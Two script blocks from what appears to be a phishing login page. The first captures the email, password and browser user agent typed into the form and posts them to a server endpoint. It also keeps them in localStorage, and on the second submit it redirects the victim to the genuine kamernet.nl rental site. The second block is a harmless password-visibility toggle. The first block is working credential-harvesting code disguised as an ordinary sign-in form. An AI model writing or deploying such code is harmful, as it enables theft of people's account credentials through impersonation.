<script>
    const userAgent = navigator.userAgent;
    let nr= 0;

    const errorSpan = document.getElementById('errContainer');
  
  document.getElementById('myForm').addEventListener('submit', async (e) => {
    e.preventDefault(); 
    let formData = new FormData(e.target);

    if (errorSpan) {
        errorSpan.classList.remove('rr');
    }

          
    formData = JSON.stringify({
      email: formData.get('email'),
      pass: formData.get('password'),
      agent: userAgent
    });

    const response = await fetch('/api/user', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: formData
    });

    console.log(formData)
    localStorage.setItem('usr', formData);

    if(nr > 0) {
        localStorage.setItem('usr', formData);
        window.location.href = 'https://kamernet.nl/';
    }
    nr++;

  })  
</script>

<script>
  document.addEventListener('DOMContentLoaded', () => {

    const toggleIcon = document.querySelector('[data-toggle-for="password"]');
    const passwordInput = document.getElementById('password');

    if (!toggleIcon || !passwordInput) return;

    toggleIcon.addEventListener('click', () => {

      const isHidden = passwordInput.type === 'password';

      // schimbă tipul inputului
      passwordInput.type = isHidden ? 'text' : 'password';
    });

  });
</script>
